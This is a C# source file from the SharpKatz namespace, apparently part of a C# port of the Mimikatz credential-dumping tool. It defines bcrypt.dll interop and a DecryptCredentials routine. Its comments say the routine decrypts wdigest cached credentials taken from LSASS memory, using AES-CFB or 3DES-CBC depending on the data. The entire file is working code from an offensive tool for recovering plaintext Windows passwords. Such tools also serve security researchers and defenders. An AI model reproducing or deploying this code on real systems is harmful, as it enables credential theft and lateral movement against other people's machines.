using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading.Tasks;
using static SharpKatz.Natives;

namespace SharpKatz.Crypto
{
#pragma warning disable 618    // Have not migrated to v4 transparency yet
    [System.Security.SecurityCritical(System.Security.SecurityCriticalScope.Everything)]
#pragma warning restore 618
    internal sealed class SafeBCryptAlgorithmHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        private SafeBCryptAlgorithmHandle() : base(true)
        {
        }

        protected override bool ReleaseHandle()
        {
            return Natives.BCryptCloseAlgorithmProvider(handle, 0) == NTSTATUS.Success;
        }
    }

    [SecuritySafeCritical]
    internal sealed class SafeBCryptKeyHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        internal SafeBCryptKeyHandle() : base(true) { }

        

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        protected override bool ReleaseHandle()
        {
            return Natives.BCryptDestroyKey(handle) == NTSTATUS.Success;
        }
    }

    class BCrypt
    {
        // Decrypt wdigest cached credentials using AES or 3Des 
        public static unsafe byte[] DecryptCredentials(byte[] encrypedPass, byte[] IV, byte[] aeskey, byte[] deskey)
        {
            SafeBCryptAlgorithmHandle hProvider, hDesProvider;
            SafeBCryptKeyHandle hAes, hDes;
            int result;
            NTSTATUS status;

            byte[] passDecrypted = new byte[1024];
            byte[] initializationVector = new byte[16];

            // Same IV used for each cred, so we need to work on a local copy as this is updated
            // each time by BCryptDecrypt
            Array.Copy(IV, initializationVector, IV.Length);

            if ((encrypedPass.Length % 8) != 0)
            {
                // If suited to AES, lsasrv uses AES in CFB mode
                Natives.BCryptOpenAlgorithmProvider(out hProvider, Natives.BCRYPT_AES_ALGORITHM, null, 0);
                Natives.BCryptSetProperty(hProvider, Natives.BCRYPT_CHAINING_MODE, Natives.BCRYPT_CHAIN_MODE_CFB, Natives.BCRYPT_CHAIN_MODE_CFB.Length, 0);
                fixed (byte* pkey = aeskey)
                fixed (byte* pencrypedPass = encrypedPass)
                fixed (byte* pinitializationVector = initializationVector)
                fixed (byte* ppassDecrypted = passDecrypted)
                {
                    Natives.BCryptGenerateSymmetricKey(hProvider, out hAes, null, 0, pkey, aeskey.Length, 0);
                    status = Natives.BCryptDecrypt(hAes, pencrypedPass, encrypedPass.Length, (void*)0, pinitializationVector, IV.Length, ppassDecrypted, passDecrypted.Length, out result, 0);
                    if (status != 0)
                    {
                        return null;
                    }
                }
            }
            else
            {
                // If suited to 3DES, lsasrv uses 3DES in CBC mode
                Natives.BCryptOpenAlgorithmProvider(out hDesProvider, Natives.BCRYPT_3DES_ALGORITHM, null, 0);
                Natives.BCryptSetProperty(hDesProvider, Natives.BCRYPT_CHAINING_MODE, Natives.BCRYPT_CHAIN_MODE_CBC, Natives.BCRYPT_CHAIN_MODE_CBC.Length, 0);
                
                fixed (byte* pkey = deskey)
                fixed (byte* pencrypedPass = encrypedPass)
                fixed (byte* pinitializationVector = initializationVector)
                fixed (byte* ppassDecrypted = passDecrypted)
                {
                    Natives.BCryptGenerateSymmetricKey(hDesProvider, out hDes, null, 0, pkey, deskey.Length, 0);
                    status = Natives.BCryptDecrypt(hDes, pencrypedPass, encrypedPass.Length, (void *)0, pinitializationVector, 8, ppassDecrypted, passDecrypted.Length, out result, 0);
                    if (status != 0)
                    {
                        return null;
                    }
                }
                
            }
            
            Array.Resize(ref passDecrypted, result );

            return passDecrypted;
        }
    }

    class Natives
    {
        public static string BCRYPT_AES_ALGORITHM = "AES";
        public static string BCRYPT_3DES_ALGORITHM = "3DES";
        public static string BCRYPT_CHAINING_MODE = "ChainingMode";

        public static string BCRYPT_CHAIN_MODE_CBC = "ChainingModeCBC";
        public static string BCRYPT_CHAIN_MODE_CFB = "ChainingModeCFB";

        [DllImport("bcrypt")]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        public static extern NTSTATUS BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int flags);

        [DllImport("bcrypt.dll")]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        internal static extern NTSTATUS BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern NTSTATUS BCryptOpenAlgorithmProvider(out SafeBCryptAlgorithmHandle phAlgorithm,
                                                                         string pszAlgId,             // BCryptAlgorithm
                                                                         string pszImplementation,    // ProviderNames
                                                                         int dwFlags);
        [DllImport("bcrypt.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern NTSTATUS BCryptSetProperty(
                SafeHandle hProvider,
                string pszProperty,
                string pbInput,
                int cbInput,
                int dwFlags);

        [DllImport("bcrypt.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern unsafe NTSTATUS BCryptGenerateSymmetricKey(
            SafeBCryptAlgorithmHandle hAlgorithm,
            out SafeBCryptKeyHandle phKey,
            byte* pbKeyObject,
            int cbKeyObject,
            byte* pbSecret,
            int cbSecret,
            int flags);

        [DllImport("bcrypt.dll", SetLastError = true)]
        public static unsafe extern NTSTATUS BCryptDecrypt(
            SafeBCryptKeyHandle hKey,
            byte* pbInput,
            int cbInput,
            void* pPaddingInfo,
            byte* pbIV,
            int cbIV,
            byte* pbOutput,
            int cbOutput,
            out int pcbResult,
            int dwFlags);
    }
}
